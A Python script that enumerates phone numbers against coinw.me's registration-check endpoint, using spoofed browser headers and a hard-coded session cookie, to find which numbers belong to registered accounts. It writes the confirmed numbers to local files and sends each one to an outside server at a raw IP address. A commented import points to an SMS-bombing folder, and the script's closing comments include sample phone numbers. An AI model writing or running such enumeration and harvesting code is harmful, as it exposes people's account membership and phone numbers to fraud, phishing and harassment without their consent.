import requests
from random import randint
# from 短信轰炸.number_mongo import number_six
from number_mongo import number_BaFangZiYuan


def check_number(number):
    url = "https://www.coinw.me/user/reg/chcekregname.html?name=" + str(number) + "&type=0&random=" + str(
        randint(1, 9) * 10)
    headers = {'Host': 'www.coinw.me', 'Connection': 'keep-alive', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache',
               'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Referer': 'https://www.coinw.me/newUser/register.html', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'JSESSIONID=B85696AD4F6DF6496F7826F1366E5C85; __cdnuid=9cd3f3744a9669184eb4410561c96e08; Hm_lvt_525b7a4b6599566fc46ec53565d28557=1529738121; __lnkrntdmcvrd=-1; zh_choose=n; username=11; Hm_lpvt_525b7a4b6599566fc46ec53565d28557=1529738339'}

    page = requests.get(url, headers=headers).text
    print(page)
    return page


def save_success_number(number):
    with open("success_币赢网.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币赢网.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":
    count = 0
    while True:
        try:
            with open("flag_币赢网.txt")as f:
                count = int(f.read())
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)

                if str(result).find("已存在") != -1:
                    save_success_number(number=line)
                    save(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_币赢网.txt", "w")as f:
                f.write(str(count))
        except:
            pass
# {"code":-1,"msg":"手机号码错误或已存在"}
# {"code":0}

"""
15874806951 26106
{"code":0}
15874807379 26107
"""
